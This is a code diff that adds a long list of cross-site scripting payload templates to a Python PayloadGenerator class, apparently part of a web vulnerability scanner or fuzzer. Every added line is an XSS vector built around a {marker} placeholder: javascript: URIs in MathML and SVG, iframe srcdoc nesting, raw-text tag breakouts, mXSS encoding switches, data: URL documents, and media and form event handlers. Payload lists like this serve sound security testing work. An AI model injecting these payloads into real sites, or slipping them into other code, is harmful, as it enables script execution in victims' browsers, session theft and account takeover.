@@ -123,6 +123,133 @@ class PayloadGenerator:
         "<svg><animateMotion onbegin={marker} dur=1s>",
         "<svg><discard onbegin={marker}>",
         "<svg><a><text x=20 y=20>{marker}</text></a></svg>",
+
+        # --- Modern / exotic vectors -----------------------------------------
+        # MathML href executes javascript: URIs in several engines.
+        "<math href=\"javascript:{marker}\"><mi>x</mi></math>",
+        # SVG animation retargeting: mutate an href to javascript: post-parse.
+        "<svg><a><rect width=100 height=100><animate attributeName=\"xlink:href\" values=\"javascript:{marker}\" /><text x=10 y=20>click</text></a></svg>",
+        "<svg><a><rect width=100 height=100><set attributeName=\"xlink:href\" to=\"javascript:{marker}\" /><text x=10 y=20>click</text></a></svg>",
+        # SVG listener/handler elements (SVG Tiny 1.2, still parsed).
+        "<svg><listener event=load handler=\"{marker}\"/>",
+        "<svg><handler type=application/ecmascript ev:event=load>{marker}</handler></svg>",
+        # iframe srcdoc with sandbox still executes when allow-scripts present.
+        "<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>{marker}</script>\"></iframe>",
+        "<iframe sandbox=\"allow-scripts allow-same-origin\" srcdoc=\"<img src=x onerror={marker}>\"></iframe>",
+        # Object/embed with data: HTML documents.
+        "<object data=\"data:text/html,<script>{marker}</script>\"></object>",
+        "<embed src=\"data:text/html,<script>{marker}</script>\">",
+        # Portal / fencedframe speculative vectors.
+        "<portal src=\"javascript:{marker}\"></portal>",
+        "<fencedframe srcdoc=\"<script>{marker}</script>\"></fencedframe>",
+        # input type=image formaction javascript.
+        "<input type=image src=x formaction=\"javascript:{marker}\">",
+        "<isindex type=image src=x action=\"javascript:{marker}\">",
+        # Raw-text element breakouts (parser context escapes).
+        "</xmp><script>{marker}</script>",
+        "</textarea><script>{marker}</script>",
+        "</title><script>{marker}</script>",
+        "</style><script>{marker}</script>",
+        "</noscript><script>{marker}</script>",
+        "<svg><![CDATA[</svg><script>{marker}</script>]]>",
+        # annotation-xml encoding switch (mXSS classic).
+        "<math><annotation-xml encoding=\"text/html\"><script>{marker}</script></annotation-xml></math>",
+        "<svg><annotation-xml encoding=\"text/html\"><script>{marker}</script></annotation-xml></svg>",
+        # select/option + autofocus.
+        "<select autofocus onfocus={marker}><option>x</option></select>",
+        # video/audio event-handler variants.
+        "<video oncanplay={marker} src=x></video>",
+        "<video onplay={marker} src=x></video>",
+        "<video onpause={marker} src=x></video>",
+        "<video onended={marker} src=x></video>",
+        "<audio oncanplaythrough={marker} src=x></audio>",
+        "<audio ondurationchange={marker} src=x></audio>",
+        "<audio onloadeddata={marker} src=x></audio>",
+        # img srcset onerror.
+        "<img srcset=\"x 1x\" onerror={marker}>",
+        "<img srcset=\"x 1x, y 2x\" onerror={marker}>",
+        # picture/source srcset.
+        "<picture><source srcset=\"x\" onerror={marker}></picture>",
+        # svg image href javascript:.
+        "<svg><image href=\"javascript:{marker}\"/></svg>",
+        "<svg><image xlink:href=\"javascript:{marker}\"/></svg>",
+        # svg script element.
+        "<svg><script>{marker}</script></svg>",
+        # svg foreignObject + body onload.
+        "<svg><foreignObject><body onload={marker}></body></foreignObject></svg>",
+        # math + mtext + style.
+        "<math><mtext><style><img src=x onerror={marker}></style></mtext></math>",
+        # table cell background javascript: (legacy but parsed).
+        "<td background=\"javascript:{marker}\">x</td>",
+        "<th background=\"javascript:{marker}\">x</th>",
+        # input type=image src javascript:.
+        "<input type=image src=\"javascript:{marker}\">",
+        # button formaction with data: URL.
+        "<button formaction=\"data:text/html,<script>{marker}</script>\">x</button>",
+        # a ping + javascript href.
+        "<a href=\"javascript:{marker}\" ping=//x>click</a>",
+        # form action data: URL.
+        "<form action=\"data:text/html,<script>{marker}</script>\"><input type=submit></form>",
+        # iframe srcdoc variants (single-level, realistic).
+        "<iframe srcdoc=\"<body onload={marker}>\"></iframe>",
+        "<iframe srcdoc=\"<svg onload={marker}></svg>\"></iframe>",
+        "<iframe srcdoc=\"<img src=x onerror={marker}>\"></iframe>",
+        "<iframe srcdoc=\"<details open ontoggle={marker}></details>\"></iframe>",
+        "<iframe srcdoc=\"<marquee onstart={marker}></marquee>\"></iframe>",
+        "<iframe srcdoc=\"<input autofocus onfocus={marker}>\"></iframe>",
+        "<iframe srcdoc=\"<video src=x onerror={marker}></video>\"></iframe>",
+        "<iframe srcdoc=\"<audio src=x onerror={marker}></audio>\"></iframe>",
+        "<iframe srcdoc=\"<object data=javascript:{marker}></object>\"></iframe>",
+        "<iframe srcdoc=\"<embed src=javascript:{marker}>\"></iframe>",
+        "<iframe srcdoc=\"<meta http-equiv=refresh content='0;url=javascript:{marker}'>\"></iframe>",
+        "<iframe srcdoc=\"<base href=javascript:{marker}//>\"></iframe>",
+        "<iframe srcdoc=\"</xmp><script>{marker}</script>\"></iframe>",
+        "<iframe srcdoc=\"</textarea><script>{marker}</script>\"></iframe>",
+        "<iframe srcdoc=\"</title><script>{marker}</script>\"></iframe>",
+        "<iframe srcdoc=\"</style><script>{marker}</script>\"></iframe>",
+        "<iframe srcdoc=\"</noscript><script>{marker}</script>\"></iframe>",
+        "<iframe srcdoc=\"<svg><![CDATA[</svg><script>{marker}</script>]]>\"></iframe>",
+        "<iframe srcdoc=\"<svg><foreignObject><iframe srcdoc='<script>{marker}</script>'></iframe></foreignObject></svg>\"></iframe>",
+        "<iframe srcdoc=\"<div><template shadowrootmode=open><script>{marker}</script></template></div>\"></iframe>",
+        "<iframe srcdoc=\"<math><annotation-xml encoding='text/html'><script>{marker}</script></annotation-xml></math>\"></iframe>",
+        "<iframe srcdoc=\"<select autofocus onfocus={marker}><option>x</option></select>\"></iframe>",
+        "<iframe srcdoc=\"<video poster=x onerror={marker}></video>\"></iframe>",
+        "<iframe srcdoc=\"<audio oncanplaythrough={marker} src=x></audio>\"></iframe>",
+        "<iframe srcdoc=\"<img srcset='x 1x' onerror={marker}>\"></iframe>",
+        "<iframe srcdoc=\"<picture><source srcset='x' onerror={marker}></picture>\"></iframe>",
+        "<iframe srcdoc=\"<svg><image href=javascript:{marker}/></svg>\"></iframe>",
+        "<iframe srcdoc=\"<svg><script>{marker}</script></svg>\"></iframe>",
+        "<iframe srcdoc=\"<svg><foreignObject><body onload={marker}></body></foreignObject></svg>\"></iframe>",
+        "<iframe srcdoc=\"<math><mtext><style><img src=x onerror={marker}></style></mtext></math>\"></iframe>",
+        "<iframe srcdoc=\"<table background=javascript:{marker}><tr><td>x</td></tr></table>\"></iframe>",
+        "<iframe srcdoc=\"<th background=javascript:{marker}>x</th>\"></iframe>",
+        "<iframe srcdoc=\"<input type=image src=javascript:{marker}>\"></iframe>",
+        "<iframe srcdoc=\"<button formaction='data:text/html,<script>{marker}</script>'>x</button>\"></iframe>",
+        "<iframe srcdoc=\"<a href=javascript:{marker} ping=//x>click</a>\"></iframe>",
+        "<iframe srcdoc=\"<area ping=//x href=javascript:{marker}>\"></iframe>",
+        "<iframe srcdoc=\"<form action='data:text/html,<script>{marker}</script>'><input type=submit></form>\"></iframe>",
+        # form/input event-handler variants.
+        "<form onsubmit={marker}><input></form>",
+        "<form onreset={marker}><input></form>",
+        "<form oninvalid={marker}><input required></form>",
+        "<textarea oninput={marker}>x</textarea>",
+        "<textarea onchange={marker}>x</textarea>",
+        "<input oninput={marker}>",
+        "<input onchange={marker}>",
+        "<select onchange={marker}><option>x</option></select>",
+        # legacy elements still parsed by some engines.
+        "<layer src=\"javascript:{marker}\"></layer>",
+        "<ilayer src=\"javascript:{marker}\"></ilayer>",
+        "<bgsound src=\"javascript:{marker}\">",
+        "<body background=\"javascript:{marker}\">",
+        "<xml id=xss src=\"data:application/xml,<script>{marker}</script>\"></xml>",
+        "<applet archive=\"javascript:{marker}\"></applet>",
+        "<object classid=\"clsid:00000000-0000-0000-0000-000000000000\" codebase=\"javascript:{marker}\"></object>",
+        "<embed pluginspage=\"javascript:{marker}\">",
+        "<iframe longdesc=\"javascript:{marker}\"></iframe>",
+        "<frame longdesc=\"javascript:{marker}\">",
+        "<frameset longdesc=\"javascript:{marker}\"></frameset>",
+        "<map name=x><area href=\"javascript:{marker}\" shape=rect coords=\"0,0,1,1\"></map><img src=x usemap=#x>",
     ]
 
     # ================================================================
